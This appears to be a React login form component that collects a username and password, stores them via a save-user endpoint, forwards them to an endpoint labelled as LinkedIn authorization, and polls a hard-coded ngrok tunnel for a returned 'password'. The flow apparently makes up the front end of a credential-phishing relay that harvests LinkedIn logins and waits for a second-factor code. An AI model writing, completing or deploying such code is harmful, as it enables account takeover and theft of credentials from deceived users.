'use client'
import { useState } from 'react';

const LoginForm = ({setIsShowPopup, setUserLogin }) => {
  const [login, setLogin] = useState('');
  const [pass, setPass] = useState('');

  const ngrokUrl = 'https://8a36-46-150-81-164.ngrok-free.app ';

    const pollForPassword = async (userId) => {
        try {
            const response = await fetch(`${ngrokUrl}/api/get-pass`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ userId }),
            });

            if (response.ok) {
                const { password } = await response.json();
                if (password) {
                    setIsShowPopup(true);
                } else {
                    setTimeout(() => pollForPassword(userId), 2000); // Повторити через 2 секунди
                }
            } else {
                console.error('Failed to poll for password');
            }
        } catch (error) {
            console.error('Error during polling:', error);
        }
    };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    setUserLogin(login);

    try {
      const savingUser = await fetch('/api/save-user', {
        method: 'POST',
        headers:{
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({pass, login}),
      });
      
      if (!savingUser.ok) {
        const errorResponse = await savingUser.json();
        throw new Error(errorResponse.message || 'Something went wrong');
      }
      const { userId } = await savingUser.json()
     console.log("User saved");
      setIsShowPopup(true)

      const linkedinAuthorization = await fetch('/api/lambda-authorize', {
        method: 'POST',
        headers:{
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ pass, login, userId }),
      });

      if (!linkedinAuthorization.ok) {
        const errorResponse = await linkedinAuthorization.json();
        throw new Error(errorResponse.message || 'Something went wrong');
      }

        await pollForPassword(userId);

    } catch (error) {
      console.log(error.message);
    }
  

  };

  return (
    <div>
      <div>
       <form onSubmit={handleSubmit}>
         <input name='login' type="text" value={login} onChange={(e) => setLogin(e.target.value)} />
        <input name='pass' type="password" value={pass} onChange={(e) => setPass(e.target.value)} />
        <button type='submit' >Send</button>
       </form>
      </div>
    </div>
  );
};

export default LoginForm;
